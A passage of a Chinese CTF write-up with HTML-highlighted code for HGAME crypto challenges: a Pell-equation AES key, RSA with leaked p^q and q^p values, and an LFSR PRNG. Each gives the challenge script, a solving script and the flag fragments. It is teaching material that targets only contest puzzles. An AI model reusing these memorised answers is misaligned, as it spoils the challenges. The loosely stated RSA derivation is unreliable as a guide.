data-num=\"21\"></td><td><pre>            r1<span class=\"token punctuation\">,</span> g1<span class=\"token punctuation\">,</span> b1 <span class=\"token operator\">=</span> pixels1<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            r2<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">,</span> b2 <span class=\"token operator\">=</span> pixels2<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            xor_pixels<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r1 <span class=\"token operator\">^</span> r2<span class=\"token punctuation\">,</span> g1 <span class=\"token operator\">^</span> g2<span class=\"token punctuation\">,</span> b1 <span class=\"token operator\">^</span> b2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">return</span> xor_image</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>a <span class=\"token operator\">=</span> xor_images<span class=\"token punctuation\">(</span>png1<span class=\"token punctuation\">,</span> png2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>a<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote 1adf\\_17eb\\_803c\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezmath100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezmath100pt\">#</a> ezMath(100pt)</h3>\n<blockquote>\n<p>题目描述：一个简单的数学题</p>\n</blockquote>\n<p>pell 方程，需要求出 y，以 y 为 key，解决 aes 的 ebc 问题</p>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> random<span class=\"token punctuation\">,</span>string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>x</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> x<span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    cipher<span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    encrypted <span class=\"token operator\">=</span>cipher<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> encrypted</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>D <span class=\"token operator\">=</span> <span class=\"token number\">114514</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">assert</span> x<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> D <span class=\"token operator\">*</span> y<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag<span class=\"token operator\">=</span>pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>key<span class=\"token operator\">=</span>pad<span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>enc<span class=\"token operator\">=</span>encrypt<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'enc=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>enc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#enc=b\"\\xce\\xf1\\x94\\x84\\xe9m\\x88\\x04\\xcb\\x9ad\\x9e\\x08b\\xbf\\x8b\\xd3\\r\\xe2\\x81\\x17g\\x9c\\xd7\\x10\\x19\\x1a\\xa6\\xc3\\x9d\\xde\\xe7\\xe0h\\xed/\\x00\\x95tz)1\\\\\\t8:\\xb1,U\\xfe\\xdec\\xf2h\\xab`\\xe5'\\x93\\xf8\\xde\\xb2\\x9a\\x9a\"</span></pre></td></tr></table></figure><p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> random<span class=\"token punctuation\">,</span>string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> x<span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    cipher<span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    encrypted <span class=\"token operator\">=</span>cipher<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> encrypted</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>encrypted_message<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    cipher <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    decrypted <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>encrypted_message<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    unpadded <span class=\"token operator\">=</span> decrypted<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">b\"\\0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> unpadded</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">solve_pell</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">,</span> numTry <span class=\"token operator\">=</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    cf <span class=\"token operator\">=</span> continued_fraction<span class=\"token punctuation\">(</span>sqrt<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>numTry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        denom <span class=\"token operator\">=</span> cf<span class=\"token punctuation\">.</span>denominator<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        numer <span class=\"token operator\">=</span> cf<span class=\"token punctuation\">.</span>numerator<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> numer<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> N <span class=\"token operator\">*</span> denom<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">return</span> numer<span class=\"token punctuation\">,</span> denom</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token number\">114514</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>pell <span class=\"token operator\">=</span> solve_pell<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pell<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#(3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199, 9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#--------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">'flag&#123;test&#125;'</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token number\">9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>key<span class=\"token operator\">=</span>pad<span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token string\">b\"\\xce\\xf1\\x94\\x84\\xe9m\\x88\\x04\\xcb\\x9ad\\x9e\\x08b\\xbf\\x8b\\xd3\\r\\xe2\\x81\\x17g\\x9c\\xd7\\x10\\x19\\x1a\\xa6\\xc3\\x9d\\xde\\xe7\\xe0h\\xed/\\x00\\x95tz)1\\\\\\t8:\\xb1,U\\xfe\\xdec\\xf2h\\xab`\\xe5'\\x93\\xf8\\xde\\xb2\\x9a\\x9a\"</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote G0od!\\_Yo3\\_k1ow\\_C0ntinued\\_Fra3ti0ns!!!!!!!\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezrsa50pt\"><a class=\"markdownIt-Anchor\" href=\"#ezrsa50pt\">#</a> ezRSA(50pt)</h3>\n<blockquote>\n<p>题目描述：一个简单的 RSA</p>\n</blockquote>\n<p>有 leak1 与 leak2，需要推到出 p q</p>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>phi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>leak1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>leak2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'leak1=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>leak1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'leak2=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>leak2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\"\"\"</span></pre></td></tr></table></figure><p>解题思路</p>\n<blockquote>\n<p>leak1 = p^q%(p<em>q)<br>\nleak2 = q^p%(p</em>q)</p>\n<p>leak = p<sup>q%(p*q)+q</sup>p%(p*q)</p>\n<p>leak = p + q = leak1 + leak2</p>\n<p>p = leak1<br>\nq = leak2</p>\n</blockquote>\n<p>如何就是已知 p q e c 求 m</p>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>d <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>invmod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote F3rmat\\_l1tt1e\\_the0rem\\_is\\_th3\\_bas1s\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezprng150pt\"><a class=\"markdownIt-Anchor\" href=\"#ezprng150pt\">#</a> ezPRNG(150pt)</h3>\n<blockquote>\n<p>题目描述：一个简单的随机数</p>\n</blockquote>\n<p>LSRF 伪随机数</p>\n<blockquote>\n<p>mask 只有第 1、4、8、11、15、20、25、28、32 这几位为 1，其余位均为 0。到这数<br>\n mask 与 R 做按位与运算得到 i，当且仅当 R 的第 1、4、8、11、15、20、25、28 这几位中也出现 1 时，i 中才可能出现 1，否则 i 中将全为 0。<br>\nlastbit 是由 i 的最低位向 i 的最高位依次做异或运算得到的，在这个过程中，所有为 0 的位我们可以忽略不计（因为 0 异或任何数等于任何数本身，不影响最后运算结果），因此 lastbit 的值仅取决于 i 中有多少个 1：当 i 中有奇数个 1 时，lastbit 等于 1；当 i 中有偶数个 1 时，lastbit 等于 0。<br>\n当 R 的第 1、4、8、11、15、20、25、28 这几位依次异或结果为 1 时，即 R 中有奇数个 1，因此将导致 i 中有奇数个 1；当 R 的第 1、4、8、11、15、20、25、28 这几位依次异或结果为 0 时，即 R 中有偶数个 1，因此将导致 i 中有偶数个 1。<br>\n因此我们可以建立出联系：lastbit 等于 R 的第 1、4、8、11、15、20、25、28 这几位依次异或的结果。</p>\n</blockquote>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">PRNG</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">,</span>mask<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    nextR <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>R <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    i<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>R<span class=\"token operator\">&amp;</span>mask<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffffffff</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    nextbit<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">while</span> i<span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        nextbit<span class=\"token operator\">^</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        i<span class=\"token operator\">=</span>i<span class=\"token operator\">//</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    nextR<span class=\"token operator\">^</span><span class=\"token operator\">=</span>nextbit </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>nextR<span class=\"token punctuation\">,</span>nextbit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>R<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">'hgame&#123;'</span><span class=\"token operator\">+</span>R<span class=\"token operator\">+</span><span class=\"token string\">'&#125;'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>R<span class=\"token operator\">=</span>R<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Rlist<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>mask<span class=\"token operator\">=</span><span class=\"token number\">0b10001001000010000100010010001001</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>output<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    R<span class=\"token operator\">=</span>Rlist<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    out<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token 